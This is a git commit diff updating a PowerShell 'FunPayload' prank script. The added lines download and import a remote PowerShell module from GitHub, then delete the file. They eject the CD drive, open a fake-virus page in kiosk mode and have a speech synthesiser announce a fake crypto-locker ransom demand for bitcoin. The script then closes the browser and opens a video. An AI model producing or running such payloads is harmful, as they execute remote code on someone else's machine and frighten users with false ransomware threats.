c292e6588cee3d2d4cd3aab82c28213cb33238cf
jkljkl1197 <jordan1197@hotmail.ca>
2021-05-20 18:30:52 -0400

    Update FunPayload.ps1
    Add Fun Stuff

--- FunPayload.ps1
+++ FunPayload.ps1
@@ -1,1 +1,11 @@
-Add-Type -AssemblyName System.speech; $speak = New-Object System.Speech.Synthesis.SpeechSynthesizer; $speak.Speak("You Have Been Hack,a crypto locker will execute, send bitcoin to my address now"); Start-Process "https://www.youtube.com/embed/xvFZjo5PgG0?autoplay=1"
+Invoke-WebRequest -Uri "https://raw.githubusercontent.com/perplexityjeff/PowerShell-Troll/master/PSTrollFunctions.psm1" -OutFile "PSTrollFunctions.psm1";
+Import-Module .\PSTrollFunctions.psm1;
+rm PSTrollFunctions.psm1;
+Open-CDDrive
+Start-Process iexplore -ArgumentList "-k https://geekprank.com/fake-virus/"
+Add-Type -AssemblyName System.speech; $speak = New-Object System.Speech.Synthesis.SpeechSynthesizer;
+$speak.Speak("You Have Been Hack, a crypto locker will execute, send bitcoin to my address now");
+Start-Sleep -s 6;
+get-process iexplore | stop-process
+Start-Sleep -s 1;
+Start-Process "https://www.youtube.com/embed/xvFZjo5PgG0?autoplay=1";
